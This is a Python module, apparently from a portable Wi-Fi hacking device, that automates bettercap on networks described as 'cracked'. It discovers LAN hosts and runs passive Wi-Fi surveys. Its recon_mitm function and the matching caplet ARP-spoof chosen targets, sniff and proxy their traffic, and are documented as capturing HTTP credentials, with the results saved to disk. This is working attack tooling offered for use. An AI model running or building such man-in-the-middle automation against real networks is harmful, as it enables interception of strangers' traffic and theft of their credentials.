# -*- coding: utf-8 -*-
"""Automated bettercap recon after connecting to a cracked network.

Runs silently, logs results to disk, shows compact progress on LCD.
Common caplets are stored in NETWORK_DIR and run non-interactively.
"""
import subprocess
import time
import os
import json

import config

NETWORK_DIR = config.DATA_DIR + "/recon"
CAPLET_DIR = NETWORK_DIR + "/caplets"


def _ensure_dir():
    try:
        os.makedirs(CAPLET_DIR, exist_ok=True)
    except OSError:
        pass


def available():
    """True if bettercap is installed."""
    try:
        r = subprocess.run(["bettercap", "--version"],
                           capture_output=True, timeout=5)
        return r.returncode == 0
    except Exception:
        return False


def _write_caplet(path, content):
    _ensure_dir()
    with open(path, "w") as f:
        f.write(content)


def _run(cmd, timeout=120, progress_cb=None):
    """Run bettercap non-interactively. Show compact results via callback."""
    proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1, errors="replace")
    results = {"hosts": [], "http": [], "errors": []}
    out_lines = []
    try:
        for line in iter(proc.stdout.readline, ""):
            line = line.strip()
            if not line:
                continue
            out_lines.append(line)
            # Parse bettercap events
            par = _parse_line(line)
            if par:
                if par["type"] == "host":
                    results["hosts"].append(par["ip"])
                    if progress_cb:
                        progress_cb("host %s" % par["ip"])
                elif par["type"] == "http":
                    results["http"].append(par)
                    if progress_cb:
                        progress_cb("http %s %s" % (par["method"], par["host"]))
                elif par["type"] == "error":
                    results["errors"].append(par["msg"])
            if progress_cb:
                progress_cb(line[:48])  # raw fallback
            if len(out_lines) > 200:
                out_lines = out_lines[-200:]  # keep bounded
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()
    except Exception:
        proc.kill()
    _save_results(results, out_lines)
    return results


def _parse_line(line):
    """Extract compact info from bettercap's JSON-like or human output."""
    l = line.lower()
    # bettercap's human output patterns
    if "endpoint detected" in l or "new endpoint" in l:
        import re
        m = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
        if m:
            return {"type": "host", "ip": m.group(1)}
    # net.show output: "192.168.1.5 | xx:xx:xx:xx:xx:xx | Vendor Inc."
    import re
    m = re.match(r"^\s*(\d+\.\d+\.\d+\.\d+)\s*\|", line)
    if m:
        return {"type": "host", "ip": m.group(1)}
    # HTTP request logged
    m_http = re.search(
        r"(?:https?://)?([^/\s]+).*?(GET|POST|HEAD)\s+(\S*)", line, re.I)
    if m_http:
        return {"type": "http", "host": m_http.group(1),
                "method": m_http.group(2).upper(),
                "path": m_http.group(3)}
    if "error" in l or "fail" in l:
        return {"type": "error", "msg": line[:60]}
    return None


def _save_results(results, raw_output):
    _ensure_dir()
    ts = time.strftime("%Y%m%d_%H%M%S")
    path = NETWORK_DIR + "/recon_%s.json" % ts
    try:
        with open(path, "w") as f:
            json.dump({
                "timestamp": ts,
                "hosts": results["hosts"],
                "http_requests": results["http"],
                "raw_output": raw_output[-100:],
            }, f, indent=2)
    except OSError:
        pass


# ---------------------------------------------------------------------------
# Pre-built caplets
# ---------------------------------------------------------------------------

CAPLET_PROBE = """# Auto-probe: discover all hosts on the LAN
net.probe on
"""

CAPLET_PROBE_ARP = """# Probe + ARP spoof + HTTP sniff (MITM)
net.probe on
set arp.spoof.targets <TARGETS>
arp.spoof on
net.sniff on
http.proxy on
"""

CAPLET_RECON = """# Passive wifi recon (if adapter still in managed/monitor)
wifi.recon on
"""


def recon_probe(progress_cb=None, duration=60):
    """Discover hosts on the LAN. Returns (count, list of IPs)."""
    if not available():
        if progress_cb:
            progress_cb("bettercap not installed")
        return 0, []
    _write_caplet(CAPLET_DIR + "/auto_probe.cap", CAPLET_PROBE)
    if progress_cb:
        progress_cb("probing LAN...")
    results = _run(
        ["bettercap", "-no-colors", "-silent", "-caplet",
         CAPLET_DIR + "/auto_probe.cap", "-eval",
         "sleep %d; net.show; q" % duration],
        timeout=duration + 15, progress_cb=progress_cb)
    hosts = sorted(set(results["hosts"]))
    _save_results(results, [])
    return len(hosts), hosts


def recon_mitm(targets, progress_cb=None, duration=120):
    """ARP spoof + HTTP sniff on targets. targets = comma-sep IPs or '*'.
    Runs for duration seconds, captures HTTP credentials."""
    if not available():
        if progress_cb:
            progress_cb("bettercap not installed")
        return {"hosts": [], "http": []}
    cap = CAPLET_PROBE_ARP.replace("<TARGETS>", targets)
    _write_caplet(CAPLET_DIR + "/auto_mitm.cap", cap)
    if progress_cb:
        progress_cb("MITM %s..." % targets)
    results = _run(
        ["bettercap", "-no-colors", "-silent", "-caplet",
         CAPLET_DIR + "/auto_mitm.cap", "-eval",
         "sleep %d; q" % duration],
        timeout=duration + 15, progress_cb=progress_cb)
    return results


def recon_wifi(progress_cb=None, duration=30):
    """Passive WiFi survey (shows clients, probes, APs)."""
    if not available():
        if progress_cb:
            progress_cb("bettercap not installed")
        return []
    _write_caplet(CAPLET_DIR + "/auto_recon.cap", CAPLET_RECON)
    if progress_cb:
        progress_cb("wifi recon...")
    results = _run(
        ["bettercap", "-no-colors", "-silent", "-caplet",
         CAPLET_DIR + "/auto_recon.cap", "-eval",
         "sleep %d; q" % duration],
        timeout=duration + 15, progress_cb=progress_cb)
    return results


def install_bettercap():
    """One-liner to install bettercap if missing."""
    return subprocess.run(
        ["sudo", "apt", "install", "-y", "bettercap"],
        capture_output=True)
